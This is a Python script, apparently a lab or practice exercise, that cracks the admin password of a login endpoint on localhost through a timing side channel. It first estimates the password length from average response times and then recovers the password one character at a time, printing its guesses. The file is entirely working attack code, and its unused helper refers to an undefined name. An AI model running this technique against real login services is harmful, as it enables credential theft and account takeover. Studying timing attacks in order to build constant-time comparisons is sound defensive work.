import string
import requests
import statistics

CHARS = string.ascii_lowercase

def random_str(size):
    return ''.join(random.choices(allowed_chars, k=size))

def apiRequest(inputPass):
    response = requests.post('http://127.0.0.1:5000/login', data={'username':'admin','password':str(inputPass)})
    respTime = response.elapsed.total_seconds()
    return respTime

def crackLength(maxLength=10, attempts=4) -> int:
    confidenceDict = {}
    for i in range(maxLength):
        lengthResponseTimes = []
        for k in range(attempts):
            lengthResponseTimes.append(apiRequest('a'*i))
        
        lengthConfidence = statistics.mean(lengthResponseTimes)
        confidenceDict[i]=lengthConfidence
    print(confidenceDict)
    return max(confidenceDict, key=confidenceDict.get)

def crackPassword(length, attempts=2):
    guess = '0'*length
    for i in range(length):
        for char in CHARS:
            newGuess = guess[:i] + char + guess[i + 1:]

            guessResponseTimes = []
            for k in range(attempts):
                guessResponseTimes.append(apiRequest(guess))
            guessTime = statistics.mean(guessResponseTimes)

            newGuessResponseTimes = []
            for k in range(attempts):
                newGuessResponseTimes.append(apiRequest(newGuess))
            newGuessTime = statistics.mean(newGuessResponseTimes)
            
            print('oldGuess: '+guess +',  newGuess: '+newGuess)
            print('oldGuessTime: '+str(guessTime) +',  newGuessTime: '+str(newGuessTime))
            
            if guessTime < newGuessTime:
                guess = newGuess
    return guess

if __name__ == '__main__':
    print("cracking password length...")
    length = crackLength()
    print(f"most likely password length {length}")
    print("cracking password...")
    password = crackPassword(length)
    print(f"password cracked:'{password}'")
